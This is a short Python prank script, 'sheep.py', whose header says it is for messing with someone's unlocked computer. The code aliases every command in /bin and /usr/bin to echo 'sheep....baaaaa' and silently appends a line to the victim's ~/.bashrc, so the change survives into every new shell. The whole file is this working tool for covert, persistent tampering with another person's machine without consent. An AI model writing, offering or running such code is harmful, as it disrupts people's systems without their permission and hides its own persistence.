#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# sheep.py - Mess with someones computer when they leave it unlocked
#
# Copyright 2012 Greg Trahair <greg.trahair@gmail.com>
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
import os


def sheep(dirs):
    binaries = []
    for dir in dirs:
        binaries.extend(os.listdir(dir))

    with open(os.path.expanduser('~/.sheep'), 'wb') as sheepfile:
        for binary in binaries:
            sheepfile.write('alias {0}="echo sheep....baaaaa "\n'.format(binary))

    with open(os.path.expanduser('~/.bashrc'), 'ab') as bashrc:
        bashrc.write('source ~/.sheep >/dev/null 2>&1\n')

if __name__ == '__main__':
    sheep(['/bin', '/usr/bin'])
